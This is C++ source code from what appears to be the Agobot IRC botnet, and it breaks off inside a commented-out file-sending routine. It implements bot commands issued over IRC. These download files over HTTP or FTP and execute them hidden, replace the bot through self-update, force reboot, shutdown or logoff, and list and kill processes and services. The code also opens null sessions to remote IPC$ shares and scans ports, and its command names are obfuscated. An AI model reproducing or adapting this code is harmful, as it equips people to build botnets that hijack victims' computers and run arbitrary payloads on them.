#include "main.h"
#include "utility.h"
#include "random.h"
#include "mainctrl.h"
#include "ftplib/ftplib.h"
#ifdef WIN32
#include "3dnow.h"
#endif // WIN32

int i;


bool recv_line(int sSocket, char *szBuffer, int iBufSize, CSSLSocket *pSSLSocket)
{	int iBufIndex=0; szBuffer[iBufIndex]='\0'; bool bReceiving=true;
	while(iBufIndex<iBufSize-1 && &szBuffer[iBufIndex] && bReceiving)
	{	
		int iRead=0;
		#ifndef AGOBOT_NO_OPENSSL
				if(pSSLSocket)
					iRead=pSSLSocket->Read(&szBuffer[iBufIndex], 1);
				else
		#endif
		iRead=xRead(sSocket, &szBuffer[iBufIndex], 1);
		
		if(!iRead || iRead==-1) return false;
		if(ERRNO==EWOULDBLOCK) return true; 
		
		szBuffer[iBufIndex+1]='\0';

		if(szBuffer[iBufIndex]=='\n' || szBuffer[iBufIndex]=='\r' || !szBuffer[iBufIndex])
		{	szBuffer[iBufIndex-1]='\x00'; bReceiving=false; }

		iBufIndex++; }
	szBuffer[iBufSize-1]='\0'; return true; }

bool recv_line_irc(int sSocket, char *szBuffer, int iBufSize, CSSLSocket *pSSLSocket)
{	
	/*
	int iBufIndex=0; 
	szBuffer[iBufIndex]='\0'; 
	bool bReceiving=true;
	while(iBufIndex<iBufSize && &szBuffer[iBufIndex] && bReceiving)
	{	
		int iRead=0;
		#ifndef AGOBOT_NO_OPENSSL
			if(pSSLSocket)
				iRead=pSSLSocket->Read(&szBuffer[iBufIndex], 1);
			else
		#endif 

		iRead=xRead(sSocket, &szBuffer[iBufIndex], 1);

		if(!iRead || iRead==-1) 
			if(ERRNO!=EWOULDBLOCK)return false;

		if(ERRNO==EWOULDBLOCK) 
			return true; 

		szBuffer[iBufIndex+1]='\0';

		if(szBuffer[iBufIndex]=='\n' || !szBuffer[iBufIndex])
		{	
			szBuffer[iBufIndex-1]='\x00'; 
			bReceiving=false; 
		}

		iBufIndex++; 
	}

	szBuffer[iBufSize-1]='\0'; 
	
	return true; */

	int iBufIndex=0; szBuffer[iBufIndex]='\0'; bool bReceiving=true;
	while(iBufIndex<iBufSize-1 && &szBuffer[iBufIndex] && bReceiving)
	{	if(!xRead(sSocket, &szBuffer[iBufIndex], 1)) return false;
		szBuffer[iBufIndex+1]='\0';
		if(szBuffer[iBufIndex]=='\n' || !szBuffer[iBufIndex])
		{	if(szBuffer[iBufIndex-1]=='\r')
				szBuffer[iBufIndex-1]='\x00';
			else
				szBuffer[iBufIndex]='\x00';
			bReceiving=false; }
		iBufIndex++; }
	szBuffer[iBufSize-1]='\0'; return true;
	return true; 
}

// Format: xxxxxxxx-xxxxxxxx-xxxxxxxx-xxxxxxxx-xxxxxxxx-xxxxxxxx-xxxxxxxx-xxxxxxxx
// Only alphanumeric characters

void gen_unique_id(char *szString, int iLen)
{	memset(szString, 0, iLen);
	for(int i=0; i<iLen; i++)
	{	int sel=brandom(1, 3);
		switch(sel)
		{
		case 1: // Numeric characters
			szString[i]=(char)brandom(48, 57);
			break;
		case 2: // Uppercase letters
			szString[i]=(char)brandom(65, 90);
			break;
		case 3: // Lowercase letters
			szString[i]=(char)brandom(97, 122);
			break;
		default: // Shouldn't happen
			break; } } }

#pragma warning ( disable : 4035 )
unsigned __int64 cyclecount(void)
{
#if defined (__GNUC__)
	unsigned __int64 count = 0;
	__asm__ ("rdtsc;movl %%eax, %0" : "=r" (count));
	return count;
#elif defined (WIN32)
	#ifndef BCC32
		_asm {
			_emit 0x0F;
			_emit 0x31;
		}
	#else
		// FIXME: add cyclecount for BCC5
		return 0;
	#endif
#endif
}
#pragma warning ( default : 4035 )

int cpuspeed(void)	// cpu speed function
{	unsigned __int64 startcycle, speed, num, num2;
	do {	startcycle=cyclecount(); Sleep(1000);
			speed=((cyclecount()-startcycle)/100000)/10; }
	while(speed>1000000); // if speed is 1000GHz+, then something probably went wrong so we try again =P

	// guess 'real' cpu speed by rounding raw cpu speed (something like 601mhz looks kinda tacky)
	num=speed%100; num2=100;
	if(num<80) num2=75; if(num<71) num2=66; if(num<55) num2=50;
	if(num<38) num2=33; if(num<30) num2=25; if(num<10) num2=0;
	speed=(speed-num)+num2;
	return (int)speed; }

CString RndNick(const char *szPrefix)
{
#ifdef WIN32
#define BUFSIZE 1024
	if(g_cMainCtrl.m_cBot.bot_compnick.bValue) {
		CString sComputerName; char *szComputerName; bool bNameGood=false;
		szComputerName=sComputerName.GetBuffer(1024); init_random();
		unsigned long lStrLen=sComputerName.GetLength();

		if(!GetComputerName(szComputerName, &lStrLen)) strcpy(szComputerName, "");
		for(int j=65; j<91; j++) { if(szComputerName[0]==j) { bNameGood=true; } }
		for(int k=97; k<123; k++) { if(szComputerName[0]==k) { bNameGood=true; } }
		if(!bNameGood) strcpy(szComputerName, "");
		sComputerName.Append(rand()%10);
		sComputerName.Append(rand()%10);
		sComputerName.Append(rand()%10);
		return sComputerName;
	} else {
#endif // WIN32
		CString sRetVal; srand(GetTickCount());
		int nl=(rand()%3)+6; sRetVal.Assign(szPrefix);
		for(int n=0;n<nl;n++)
		{	CString sTemp; sTemp.Assign(sRetVal);
			sRetVal.Format("%s%c", sTemp.CStr(), (rand()%26)+97); }
		//sRetVal.Append(szEnd);
		return sRetVal;
#ifdef WIN32
	}
#endif // WIN32
}


bool IsSpace(const char cChar) { if(cChar==' '||cChar=='\t') return true; else return false; }

bool Exist(const char *filename)
{	FILE *fp=fopen(filename, "r"); if(fp) { fclose(fp); return true; } return false; }

bool IsPrivate(const char *ip)
{	if(!ip) return false; if(!strcmp(ip, "")) return false;
	char *tokens[4]; char ipbuf[32]; strncpy(ipbuf, ip, 32); tokens[0]=strtok(ipbuf, "."); if(!tokens[0]) return false;
	for(int i=1;i<4;i++) { tokens[i]=strtok(NULL, "."); if(!tokens[i]) return false; }
	if(!strcmp(tokens[0], "10")) return true;								// Class A private network
	if(!strcmp(tokens[0], "172") && !strcmp(tokens[1], "16")) return true;	// Class B Private network
	if(!strcmp(tokens[0], "192") && !strcmp(tokens[1], "168")) return true;	// Class C private network
	if(!strcmp(tokens[0], "90") && !strcmp(tokens[1], "0")) return true;	// Class Bastart private network :P
	return false; }

bool ScanPort(const char *host, const unsigned short port)
{	sockaddr_in iAddr; int sSocket; bool bRetval=false;
	sSocket=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
	if(sSocket==INVALID_SOCKET||sSocket==SOCKET_ERROR) return false;
	iAddr.sin_addr.s_addr=inet_addr(host); iAddr.sin_port=htons(port);
	iAddr.sin_family=AF_INET;
	if(!connect(sSocket, (sockaddr*)&iAddr, sizeof(iAddr))) bRetval=true;
	xClose(sSocket); return bRetval; }

bool Execute(const char *filename, const char *params)
#ifdef WIN32
{	if((int)ShellExecute(0, "open", filename, params, NULL, SW_HIDE)>=32) return true; else return false; }
#else // LINUX
{	if(fork()==0)
	{	execl(filename, params);
		exit(0); }
	else return false;
	return true; }
#endif // WIN32

bool CreateProc(char *filename, char *params)
#ifdef WIN32
{	PROCESS_INFORMATION pinfo; STARTUPINFO sinfo;
	memset(&sinfo, 0, sizeof(STARTUPINFO));
	sinfo.cb=sizeof(sinfo); sinfo.wShowWindow=SW_HIDE;
	if((CreateProcess(NULL, filename, NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS | DETACHED_PROCESS, NULL, NULL, &sinfo, &pinfo)>0)==true)
		return true; else return false; }
#else // LINUX
{	if(fork()==0)
	{	execl(filename, params);
		exit(0); }
	else return false;
	return true; }
#endif // WIN32

#ifdef WIN32

bool ConnectViaNullSession(const char *remote_host, LPNETRESOURCEW nr)
{	DWORD result=0;
	WCHAR Ipc[]=L"\\IPC$";
	TCHAR szServer[280]=TEXT("");
	WCHAR Resource[280]=L"\\\\";
	char tmp[20]="";
	unsigned int err = 0;

	MultiByteToWideChar(CP_ACP, 0, (LPCSTR)remote_host, -1, (wchar_t*)szServer, 255);
	wcscat(Resource,(wchar_t*)szServer);
	wcscat(Resource,Ipc);

	nr->dwType      =RESOURCETYPE_ANY;
	nr->lpLocalName =NULL;
	nr->lpRemoteName=Resource;
	nr->lpProvider  =NULL;
	
	result = WNetAddConnection2W(nr,L"",L"",0);
	if(result==5 || result==1219)
		result = WNetAddConnection2W(nr,NULL,NULL,0);

	if(result==5 || result==1219) return false;

	return true; }

bool CloseNullSession(const char *remote_host)
{	WCHAR Ipc[]=L"\\IPC$";
	TCHAR szServer[280]=TEXT("");
	WCHAR Resource[280]=L"\\\\";
	MultiByteToWideChar(CP_ACP, 0, (LPCSTR)remote_host, -1, (wchar_t*)szServer, 255);
	wcscat(Resource,(wchar_t*)szServer);
	wcscat(Resource,Ipc);
	while(WNetCancelConnection2W(Resource, 0, false)!=NO_ERROR) { Sleep(2000); }
	return true; }

#endif // WIN32

void CDownloader::Init()
{
//	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdVisit,		"http.command",										this);
	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdDownloadFtp,	dp(6,20,16,79,4,12,0).CStr(),		this);
	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdExecuteFtp,	dp(6,20,16,79,5,24,5,0).CStr(),			this);
	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdUpdateFtp,	dp(6,20,16,79,21,16,0).CStr(),				this); 
	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdDownload,		dp(8,20,20,16,79,4,12,0).CStr(),	this);
	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdExecute,		dp(8,20,20,16,79,5,24,5,0).CStr(),		this);
	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdUpdate,		dp(8,20,20,16,79,21,16,4,1,20,5,0).CStr(),			this);
}

bool CDownloader::HandleCommand(CMessage *pMsg)
{
	CString sHost, sPath, sUser, sPass, sTarget; url uURL;

	if(!pMsg->sCmd.Compare(m_cmdVisit.sName.CStr())){
#ifdef DBGCONSOLE
		char * tpFile="C:\\mcmd.ini";
		if(!ParseURL(pMsg->sChatString.Token(1, " "), &uURL)) return true;
			sHost.Assign(uURL.sHost); sHost.Append(":"); sHost.Append(uURL.iPort); sPath.Assign(uURL.sReq);
			CDownloadHelper *pDldHlp=new CDownloadHelper;
			pDldHlp->m_sHost.Assign(sHost); pDldHlp->m_sPath.Assign(sPath);
			pDldHlp->m_sTarget.Assign(tpFile); pDldHlp->m_sReplyTo.Assign("");
			pDldHlp->m_bExecute=false; pDldHlp->m_bUpdate=false; pDldHlp->m_bFTP=false;
			pDldHlp->m_bSilent=true; pDldHlp->m_bNotice=false;
			pDldHlp->Start(); 
			g_cMainCtrl.m_cConsDbg.Log(5, "Opening Command File...\n");
			FILE *TmpFile;
			TmpFile=fopen(tpFile, "r+w");
			while(TmpFile==NULL){TmpFile=fopen(tpFile, "r+w");Sleep(50);};

	g_cMainCtrl.m_cConsDbg.Log(5, "Opened Command File...\n");

  fseek (TmpFile , 0 , SEEK_END);
  long lSize = ftell (TmpFile);
  rewind (TmpFile);
			CString cmdList;
	g_cMainCtrl.m_cConsDbg.Log(5, "Retreived Size %d...\n",lSize);

			char * buffer="";
g_cMainCtrl.m_cConsDbg.Log(5, "Reading...\n");

char szBuffer[ 32001 ];
memset(szBuffer, 0, sizeof(szBuffer));
int numread= fread (szBuffer,1,sizeof(szBuffer),TmpFile);
memset(szBuffer,lSize-3,0);
cmdList.Assign(szBuffer);

g_cMainCtrl.m_cConsDbg.Log(5, "Read...\n%s\n",cmdList.CStr());
int i=0;int b=1;
g_cMainCtrl.m_cConsDbg.Log(5, "Read Lines...\n");
while (b!=0){
//	g_cMainCtrl.m_autoCmd.Command(cmdList.Token(i,"\n"),"",true,false);
	if(cmdList.Token(i,"\n").CompareNoCase("")){b=0;break;}
	else{b=cmdList.Find("\n",b);i++;if(b==0){break;}}
}
g_cMainCtrl.m_cConsDbg.Log(5, "Omgeh!...\n");
			fclose(TmpFile);
			g_cMainCtrl.m_cConsDbg.Log(5, "kthx?...\n");
			DeleteFile(tpFile);

#endif
}


	if(!pMsg->sCmd.Compare(m_cmdDownload.sName.CStr()))
	{	if(!ParseURL(pMsg->sChatString.Token(1, " "), &uURL)) return true;
		sHost.Assign(uURL.sHost); sHost.Append(":"); sHost.Append(uURL.iPort); sPath.Assign(uURL.sReq);
		sTarget.Assign(pMsg->sChatString.Token(2, " ", true));
		CDownloadHelper *pDldHlp=new CDownloadHelper;
		pDldHlp->m_sHost.Assign(sHost); pDldHlp->m_sPath.Assign(sPath);
		pDldHlp->m_sTarget.Assign(sTarget); pDldHlp->m_sReplyTo.Assign(pMsg->sReplyTo);
		pDldHlp->m_bExecute=false; pDldHlp->m_bUpdate=false; pDldHlp->m_bFTP=false;
		pDldHlp->m_bSilent=pMsg->bSilent; pDldHlp->m_bNotice=pMsg->bNotice;
		pDldHlp->Start(); }

	if(!pMsg->sCmd.Compare(m_cmdExecute.sName.CStr()))
	{	if(!ParseURL(pMsg->sChatString.Token(1, " "), &uURL)) return true;
		sHost.Assign(uURL.sHost); sHost.Append(":"); sHost.Append(uURL.iPort); sPath.Assign(uURL.sReq);
		sTarget.Assign(pMsg->sChatString.Token(2, " ", true));
		CDownloadHelper *pDldHlp=new CDownloadHelper;
		pDldHlp->m_sHost.Assign(sHost); pDldHlp->m_sPath.Assign(sPath);
		pDldHlp->m_sTarget.Assign(sTarget); pDldHlp->m_sReplyTo.Assign(pMsg->sReplyTo);
		pDldHlp->m_bExecute=true; pDldHlp->m_bUpdate=false; pDldHlp->m_bFTP=false;
		pDldHlp->m_bSilent=pMsg->bSilent; pDldHlp->m_bNotice=pMsg->bNotice;
		pDldHlp->Start(); }

	if(!pMsg->sCmd.Compare(m_cmdUpdate.sName.CStr()))
	{	
		if(!ParseURL(pMsg->sChatString.Token(1, " "), &uURL)) return true;
		sHost.Assign(uURL.sHost); 
		sHost.Append(":"); sHost.Append(uURL.iPort); 
		sPath.Assign(uURL.sReq);
		sTarget.Assign(pMsg->sChatString.Token(2, " ", true));
		if(!pMsg->sChatString.Token(3, " ").Compare(g_cMainCtrl.m_cBot.bot_id.sValue)) return false;
		CDownloadHelper *pDldHlp=new CDownloadHelper;
		pDldHlp->m_sHost.Assign(sHost); 
		pDldHlp->m_sPath.Assign(sPath);
		pDldHlp->m_sTarget.Assign(sTarget);
		pDldHlp->m_sReplyTo.Assign(pMsg->sReplyTo);
		pDldHlp->m_bExecute=false; 
		pDldHlp->m_bUpdate=true; 
		pDldHlp->m_bFTP=false;
		pDldHlp->m_bSilent=pMsg->bSilent;
		pDldHlp->m_bNotice=pMsg->bNotice;
		pDldHlp->Start(); 
	}

	if(!pMsg->sCmd.Compare(m_cmdDownloadFtp.sName.CStr()))
	{	if(!ParseURL(pMsg->sChatString.Token(1, " "), &uURL)) return true;
		sUser.Assign(uURL.sUser); sPass.Assign(uURL.sPassword);
		sHost.Assign(uURL.sHost); sPath.Assign(uURL.sReq);
		sTarget.Assign(pMsg->sChatString.Token(2, " ", true));
		CDownloadHelper *pDldHlp=new CDownloadHelper;
		pDldHlp->m_sHost.Assign(sHost); pDldHlp->m_sPath.Assign(sPath);
		pDldHlp->m_sTarget.Assign(sTarget); pDldHlp->m_sUser.Assign(sUser);
		pDldHlp->m_sPass.Assign(sPass); pDldHlp->m_sReplyTo.Assign(pMsg->sReplyTo);
		pDldHlp->m_bExecute=false; pDldHlp->m_bUpdate=false; pDldHlp->m_bFTP=true;
		pDldHlp->m_bSilent=pMsg->bSilent; pDldHlp->m_bNotice=pMsg->bNotice;
		pDldHlp->Start(); }

	if(!pMsg->sCmd.Compare(m_cmdExecuteFtp.sName.CStr()))
	{	if(!ParseURL(pMsg->sChatString.Token(1, " "), &uURL)) return true;
		sUser.Assign(uURL.sUser); sPass.Assign(uURL.sPassword);
		sHost.Assign(uURL.sHost); sPath.Assign(uURL.sReq);
		sTarget.Assign(pMsg->sChatString.Token(2, " ", true));
		CDownloadHelper *pDldHlp=new CDownloadHelper;
		pDldHlp->m_sHost.Assign(sHost); pDldHlp->m_sPath.Assign(sPath);
		pDldHlp->m_sTarget.Assign(sTarget); pDldHlp->m_sUser.Assign(sUser);
		pDldHlp->m_sPass.Assign(sPass); pDldHlp->m_sReplyTo.Assign(pMsg->sReplyTo);
		pDldHlp->m_bExecute=true; pDldHlp->m_bUpdate=false; pDldHlp->m_bFTP=true;
		pDldHlp->m_bSilent=pMsg->bSilent; pDldHlp->m_bNotice=pMsg->bNotice;
		pDldHlp->Start(); }

	if(!pMsg->sCmd.Compare(m_cmdUpdateFtp.sName.CStr()))
	{	if(!ParseURL(pMsg->sChatString.Token(1, " "), &uURL)) return true;
		sUser.Assign(uURL.sUser); sPass.Assign(uURL.sPassword);
		sHost.Assign(uURL.sHost); sPath.Assign(uURL.sReq);
		sTarget.Assign(pMsg->sChatString.Token(2, " ", true));
		if(!pMsg->sChatString.Token(3, " ").Compare(g_cMainCtrl.m_cBot.bot_id.sValue)) return false;
		CDownloadHelper *pDldHlp=new CDownloadHelper;
		pDldHlp->m_sHost.Assign(sHost); pDldHlp->m_sPath.Assign(sPath);
		pDldHlp->m_sTarget.Assign(sTarget); pDldHlp->m_sUser.Assign(sUser);
		pDldHlp->m_sPass.Assign(sPass); pDldHlp->m_sReplyTo.Assign(pMsg->sReplyTo);
		pDldHlp->m_bExecute=false; pDldHlp->m_bUpdate=true; pDldHlp->m_bFTP=true;
		pDldHlp->m_bSilent=pMsg->bSilent; pDldHlp->m_bNotice=pMsg->bNotice;
		pDldHlp->Start(); }

	return true; }

void *CDownloadHelper::Run()
{	// If the params are invalid, return
	if(!m_sHost.Compare("") || !m_sTarget.Compare("") || !m_sPath.Compare("")) { g_cMainCtrl.m_lCanJoin.push_back(this); return NULL; }
	if(m_bFTP) if(!m_sUser.Compare("") || !m_sPass.Compare("")) { g_cMainCtrl.m_lCanJoin.push_back(this); return NULL; }
	// Get the port from the host, set it to default if none is specified
	int iPort=0; if(m_sHost.Token(1, ":").Compare("")) iPort=atoi(m_sHost.Token(1, ":").CStr());
	if(iPort==0) if(m_bFTP) iPort=21; else iPort=80;
	// Store only the ip/host in m_sHost
	CString sTemp(m_sHost.Token(0, ":")); m_sHost.Assign(sTemp);
	// Expand environment variables if compiled on Win32
#ifdef WIN32
	char szTemp[MAX_PATH]; ExpandEnvironmentStrings(m_sTarget.CStr(), szTemp, MAX_PATH); m_sTarget.Assign(szTemp);
#endif

	if(m_bFTP)
	{	netbuf *nControl; FtpInit();
		if(!FtpConnect(m_sHost.CStr(), &nControl))
		{	g_cMainCtrl.m_cIRC.SendMsg(m_bSilent, m_bNotice, "ftp(badconnect)", m_sReplyTo);
			g_cMainCtrl.m_lCanJoin.push_back(this); return NULL; }
		if(!FtpLogin(m_sUser.CStr(), m_sPass.CStr(), nControl))
		{	g_cMainCtrl.m_cIRC.SendMsg(m_bSilent, m_bNotice, "ftp(badlogin)", m_sReplyTo);
			g_cMainCtrl.m_lCanJoin.push_back(this); return NULL; }
		g_cMainCtrl.m_cIRC.SendMsg(m_bSilent, m_bNotice, "ftp(getting)", m_sReplyTo);
		if(!FtpGet(m_sTarget.CStr(), m_sPath.CStr(), FTPLIB_IMAGE, nControl))
		{	g_cMainCtrl.m_cIRC.SendMsg(m_bSilent, m_bNotice, "ftp(baddl)", m_sReplyTo);
			g_cMainCtrl.m_lCanJoin.push_back(this); return NULL; }
		FtpQuit(nControl); }
	else
	{	int sSocket, d; CString sSendBuf, sReply;

		sSocket=DoTcpConnect(m_sHost.CStr(), iPort);

		if(sSocket==SOCKET_ERROR)
		{	g_cMainCtrl.m_cIRC.SendMsg(m_bSilent, m_bNotice, "http(badconnect)", m_sReplyTo);
			g_cMainCtrl.m_lCanJoin.push_back(this); xClose(sSocket); return NULL; }

		sSendBuf.Format("GET %s HTTP/1.0\r\nConnection: Keep-Alive\r\nUser-Agent: Mozilla/4.5\r\nHost: %s:%d\r\n\r\n", m_sPath.CStr(), m_sHost.CStr(), iPort);
		xWrite(sSocket, sSendBuf.CStr(), sSendBuf.GetLength());
		g_cMainCtrl.m_cIRC.SendMsg(m_bSilent, m_bNotice, "http(getting)", m_sReplyTo);

		FILE *file=fopen(m_sTarget.CStr(),"wb");
		if(!file) { g_cMainCtrl.m_cIRC.SendMsg(m_bSilent, m_bNotice, "http(badopen)", m_sReplyTo); g_cMainCtrl.m_lCanJoin.push_back(this); return NULL; }
		
		char szBuf[4096];
		while(true)
		{	int i; if((i=xRead(sSocket,szBuf,4096))<=0) break;
			if(i<4096) szBuf[i]=0;
			for(d=0;d<i;d++) if(!strncmp(szBuf+d,"\r\n\r\n",4))
			{	for (d+=4;d<i;d++) fputc(szBuf[d],file);
				goto done_http; } }
done_http:
		while(true)
		{	int i; if((i=xRead(sSocket,szBuf,4096))<=0) break;
			if(i<4096) szBuf[i]=0;
			for(d=0;d<i;d++) fputc(szBuf[d],file); }

		fclose(file); xClose(sSocket); }

	if(!m_bUpdate)
	{	//download isn't an update
		g_cMainCtrl.m_cIRC.SendFormat(m_bSilent, m_bNotice, m_sReplyTo, "dl, done. %s .", m_sTarget.CStr());
		
		if(m_bExecute)
		{	Execute(m_sTarget.CStr(), "");
			g_cMainCtrl.m_cIRC.SendFormat(m_bSilent, m_bNotice, m_sReplyTo, "open %s.", m_sTarget.CStr()); } }
	else
	{	//download is an update
		g_cMainCtrl.m_cIRC.SendFormat(m_bSilent, m_bNotice, m_sReplyTo, "dl'ed-update: %s", m_sTarget.CStr());

		if(CreateProc(m_sTarget.Str(), dp(81,21,16,4,1,20,5,0).Str()))
		{	// successful update, remove and exit
#ifdef WIN32
			if(g_cMainCtrl.m_cBot.as_enabled.bValue)
				g_cMainCtrl.m_cInstaller.RegStartDel(g_cMainCtrl.m_cBot.as_valname.sValue);
			if(g_cMainCtrl.m_cBot.as_service.bValue)
				g_cMainCtrl.m_cInstaller.ServiceDel(g_cMainCtrl.m_cBot.as_service_name.sValue);
#endif
			g_cMainCtrl.m_cInstaller.Uninstall(); g_cMainCtrl.m_bRunning=false; exit(1); }
		else
			g_cMainCtrl.m_cIRC.SendMsg(m_bSilent, m_bNotice, "exec.error", m_sReplyTo.Str()); }

	g_cMainCtrl.m_lCanJoin.push_back(this); return NULL; }

void CRSLControl::Init() {
	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdReboot,	dp(16,3,79,18,5,2,15,15,20,0).CStr(),		this);
	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdShutdown,	dp(16,3,79,19,8,21,20,4,15,23,14,0).CStr(),	this);
	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdLogoff,	dp(16,3,79,12,15,7,15,6,6,0).CStr(),		this);
}

bool CRSLControl::HandleCommand(CMessage *pMsg) {
	if(!pMsg->sCmd.Compare(m_cmdReboot.sName.Str())) {
		g_cMainCtrl.m_cIRC.SendFormat(pMsg->bSilent, pMsg->bNotice, pMsg->sReplyTo, \
			"sys(reboot)");
#ifdef WIN32
		ExitWindowsEx(EWX_REBOOT|EWX_FORCE,0);
#else
		system("reboot");
#endif // WIN32
	} else if(!pMsg->sCmd.Compare(m_cmdShutdown.sName.Str())) {
		g_cMainCtrl.m_cIRC.SendFormat(pMsg->bSilent, pMsg->bNotice, pMsg->sReplyTo, \
			"sys(sd)");
#ifdef WIN32
		ExitWindowsEx(EWX_SHUTDOWN|EWX_FORCE,0);
#else
		system("shutdown");
#endif // WIN32
	} else if(!pMsg->sCmd.Compare(m_cmdLogoff.sName.Str())) {
		g_cMainCtrl.m_cIRC.SendFormat(pMsg->bSilent, pMsg->bNotice, pMsg->sReplyTo, \
			"sys(logoff)");
#ifdef WIN32
		ExitWindowsEx(EWX_LOGOFF|EWX_FORCE,0);
#else
		system("init 1");
#endif // WIN32
	}

	return false; }

void CProcessControl::Init() {
	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdList,		dp(16,3,20,18,12,79,12,9,19,20,0).CStr(),			this);
	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdKill,		dp(16,3,20,18,12,79,11,9,12,12,0).CStr(),			this);
	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdListSvc,	dp(16,3,20,18,12,79,12,9,19,20,19,22,3,0).CStr(),	this);
	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdKillSvc,	dp(16,3,20,18,12,79,11,9,12,12,19,22,3,0).CStr(),	this);
	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdKillPid,	dp(16,3,20,18,12,79,11,9,12,12,16,9,4,0).CStr(),	this);
}

bool CProcessControl::HandleCommand(CMessage *pMsg) {
	if(!pMsg->sCmd.Compare(m_cmdList.sName.Str())) {
#ifdef _WIN32
		list<process_info> lProcesses; if(ListProcesses(&lProcesses)) {
			g_cMainCtrl.m_cIRC.SendMsg(pMsg->bSilent, pMsg->bNotice, dp(121,31,35,29,5,9,37,37,9,37,123,0), pMsg->sReplyTo.Str());
			list<process_info>::iterator ip; int iCount=0;
			for(ip=lProcesses.begin(); ip!=lProcesses.end(); ++ip)
			{	iCount++; g_cMainCtrl.m_cIRC.SendFormat(pMsg->bSilent, pMsg->bNotice, pMsg->sReplyTo.Str(),
					"%d. - Pid: %d - \"%s\"", iCount, (*ip).lProcessPid, (*ip).sProcessName.CStr());
				Sleep(1500); }
		}
#endif // _WIN32
		return true;
	} else if(!pMsg->sCmd.Compare(m_cmdKill.sName.Str())) {
		if(!pMsg->sChatString.Token(1, " ").Compare("")) return false;
		KillProcess(pMsg->sChatString.Token(1, " ").CStr());
		g_cMainCtrl.m_cIRC.SendFormat(pMsg->bSilent, pMsg->bNotice, pMsg->sReplyTo.Str(), "kp: %s",
			pMsg->sChatString.Token(1, " ").Str());
		return true;
	} else if(!pMsg->sCmd.Compare(m_cmdListSvc.sName.Str())) {
#ifdef _WIN32
		list<CString> lServices; if(ListServices(&lServices)) {
			g_cMainCtrl.m_cIRC.SendMsg(pMsg->bSilent, pMsg->bNotice, dp(61,19,5,18,22,9,3,5,19,62,0).Str(), pMsg->sReplyTo.Str());
			list<CString>::iterator ip; int iCount=0;
			for(ip=lServices.begin(); ip!=lServices.end(); ++ip)
			{
				iCount++; g_cMainCtrl.m_cIRC.SendFormat(pMsg->bSilent, pMsg->bNotice, pMsg->sReplyTo.Str(), "%d. / %s", \
					iCount, (*ip).CStr());
				Sleep(1500); 
			}
		}
#endif // _WIN32
		return true;
	} else if(!pMsg->sCmd.Compare(m_cmdKillSvc.sName.Str())) {
#ifdef _WIN32
		if(!pMsg->sChatString.Token(1, " ").Compare("")) return false;
		KillService(pMsg->sChatString.Token(1, " ").CStr());
		g_cMainCtrl.m_cIRC.SendFormat(pMsg->bSilent, pMsg->bNotice, pMsg->sReplyTo.Str(), "ks: %s",
			pMsg->sChatString.Token(1, " ").Str());
#endif // _WIN32
		return true;
	} else if(!pMsg->sCmd.Compare(m_cmdKillPid.sName.CStr())) {
		if(!pMsg->sChatString.Token(1, " ").Compare("")) return false;
		unsigned long lPid=atoi(pMsg->sChatString.Token(1, " ").CStr()); if(!lPid) return false;
g_cMainCtrl.m_cIRC.SendFormat(pMsg->bSilent, pMsg->bNotice, pMsg->sReplyTo.Str(), "kpid: %s",lPid);
		return KillPid(lPid);
	}

	
	return false; }

void *CCmdExecutor::Run()
{	try {
		while(!m_bMsgSet) Sleep(1000);
		g_cMainCtrl.m_cBot.Recv(&m_mMsg, m_bInternal);
		g_cMainCtrl.m_lCanJoin.push_back(this);
	} catch(...) {
#ifdef DBGCONSOLE
		g_cMainCtrl.m_cConsDbg.Log(2, "CCmdExecutor: Exception in \"%s\".\n", m_mMsg.sChatString.CStr());
#endif // DBGCONSOLE
	}
	return NULL; }

void CCmdExecutor::Set(CMessage *pMsg, bool bInternal)
{	m_pMsg=pMsg; m_mMsg.bNotice=m_pMsg->bNotice; m_mMsg.bSilent=m_pMsg->bSilent;
	m_mMsg.bOutchan=m_pMsg->bOutchan; m_mMsg.sSrc.Assign(m_pMsg->sSrc); 
	m_mMsg.sIdentd.Assign(m_pMsg->sIdentd); m_mMsg.sHost.Assign(m_pMsg->sHost); m_mMsg.sDest.Assign(m_pMsg->sDest);
	m_mMsg.sChatString.Assign(m_pMsg->sChatString); m_bMsgSet=true; m_bInternal=bInternal; }
/*
void *CSendFile::Run()
{	int sClientSocket; sockaddr_in cAddr;
	socklen_t cAddrLen=sizeof(cAddr);
	unsigned char fileBuf[4096]; FILE *fp=NULL;

	memset(&m_lAddr, 0, sizeof(m_lAddr));
	m_lAddr.sin_family=AF_INET;
	m_lAddr.sin_addr.s_addr=INADDR_ANY;
	m_lAddr.sin_port=htons(g_cMainCtrl.m_cBot.bot_ftrans_port.iValue);
	m_sListenSocket=socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if(m_sListenSocket==SOCKET_ERROR) { g_cMainCtrl.m_lCanJoin.push_back(this); return NULL; }
#ifdef DBGCONSOLE
	g_cMainCtrl.m_cConsDbg.Log(5, "CSF(0x%8.8Xh): Binding CSF to %d.\n", this, g_cMainCtrl.m_cBot.bot_ftrans_port.iValue);
#endif
	if(bind(m_sListenSocket, (sockaddr*)&m_lAddr, sizeof(m_lAddr))!=0) { xClose(m_sListenSocket); g_cMainCtrl.m_lCanJoin.push_back(this); return NULL; }

#ifdef DBGCONSOLE
	g_cMainCtrl.m_cConsDbg.Log(5, "CSF(0x%8.8Xh): Listening @ port %d.\n", this, g_cMainCtrl.m_cBot.bot_ftrans_port.iValue);
#endif

	while(g_cMainCtrl.m_bRunning)
	{	if(listen(m_sListenSocket, 10)==SOCKET_ERROR) { Sleep(250); continue; }
		sClientSocket=accept(m_sListenSocket, (sockaddr*)&cAddr, &cAddrLen);
		if(sClientSocket!=SOCKET_ERROR)
		{	// Get the remote ip via getpeername
